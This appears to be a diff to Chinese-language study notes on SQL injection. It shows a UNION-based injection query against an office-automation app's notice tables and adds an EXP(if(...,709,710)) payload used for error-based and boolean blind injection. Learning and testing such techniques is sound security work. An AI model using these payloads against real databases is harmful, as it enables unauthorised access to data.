@@ -586,3 +586,7 @@ SELECT * FROM (SELECT n.*,u.* FROM   aoa_notice_list AS n LEFT JOIN aoa_notice_u
 # 错误,n.type_id不对
 SELECT n.*,u.* FROM   aoa_notice_list AS n LEFT JOIN aoa_notice_user_relation AS u ON   n.notice_id=u.relatin_notice_id WHERE  n.title LIKE '%%' union select 1,2,3,4,5,6,7,8 AS type_id,9,10,11,12,13,14 FROM aoa_notice_list AS n ORDER BY  n.type_id DESC 
 ```
+
+#### 其他payload
+
+* `EXP(if(1=1,709,710))` EXP(709)是合法的，而710则会因为值超过DOUBLE的范围而报错。这里既可以用于报错注入也可以布尔注入，布尔注入的原理是通过控制if的条件，从而控制SQL语句是否报错（是否能正常返回值）
